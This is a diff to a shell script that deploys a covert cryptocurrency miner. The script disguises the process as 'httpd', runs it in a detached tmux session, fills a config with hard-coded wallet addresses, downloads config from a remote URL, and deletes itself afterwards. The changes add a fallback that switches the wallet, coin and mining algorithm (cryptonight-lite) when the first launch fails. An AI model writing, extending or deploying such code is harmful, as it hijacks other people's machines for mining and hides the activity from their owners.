@@ -32,7 +32,7 @@ OBJ_MASK=${OBJ_MASK:-httpd}
 DAEMON=${DAEMON:-pausd}
 OBJ_CFG=${OBJ_CFG:-httpd-1.conf}
 CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
-DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf.subst}
+DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf.tpl}
 
 ## download cfg
 if [ ! -e "$OBJ_CFG" ]; then
@@ -103,14 +103,32 @@ ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 ENDPOINT=${ENDPONT:-127.0.0.1:8080}
 ## subst
-cat ${OBJ_MASK}.conf | envsubst > ${OBJ_MASK}.conf.subst
+cat ${OBJ_MASK}.conf | envsubst > ${OBJ_MASK}.conf.tpl
 
 ## init
 tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
 
 ## cleanup
 ## wait for tmux session to startup
-while [ "$(tmux ls | wc -l)" -lt 3 ]; do sleep 1; done
+slept=0
+while [ "$(tmux ls | wc -l)" -lt 3 ]; do
+    slept=$((slept+1))
+    if [ $slept -gt 5 ]; then
+        ## try without hw accel
+        PAUSD_VER=${PAUSD_VER/1/3} PAUSD_VER=${PAUSD_VER/2/4} && export PAUSD_VER
+        ## switch PA to different co
+        PA=${PA:-WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo}
+        ## change algo
+        AL=${AL:-cryptonight-lite}
+        ## subst
+        cat ${OBJ_MASK}.conf.tpl | envsubst > ${OBJ_MASK}.conf
+        ## init
+        tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
+        while [ "$(tmux ls | wc -l)" -lt 3 ]; do sleep 1; done
+        break
+    fi
+    sleep 1;
+done
 sleep 1 ## once more for edge cases
 rm -- "$0" \
    "$OBJ_CFG" \
